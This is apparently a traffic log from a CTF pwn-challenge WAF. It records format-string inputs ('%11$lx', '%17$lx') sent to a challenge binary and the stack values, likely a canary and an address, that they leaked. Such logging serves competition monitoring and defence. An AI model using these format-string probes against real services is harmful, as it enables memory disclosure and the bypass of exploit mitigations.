// Date: 2021-11-27 06:16:49
// SKYCTF PWN WAF
// Deved By I0gan
team_name: 歪歪歪？

user_name: Sauimezias


<-------------------- read ------------------>
%11$lx

r_0 = "\x25\x31\x31\x24\x6c\x78\x0a"

<-------------------- write ----------------->
df6c7245958e6f00
--+--

w_0 = "\x64\x66\x36\x63\x37\x32\x34\x35\x39\x35\x38\x65\x36\x66\x30\x30\x0a\x2d\x2d\x2b\x2d\x2d\x0a"

<-------------------- read ------------------>
%17$lx

r_1 = "\x25\x31\x37\x24\x6c\x78\x0a"

<-------------------- write ----------------->
55da9711a9dc
logger: chall env released
logger: sky_token_is_wrong

w_1 = "\x35\x35\x64\x61\x39\x37\x31\x31\x61\x39\x64\x63\x0a"
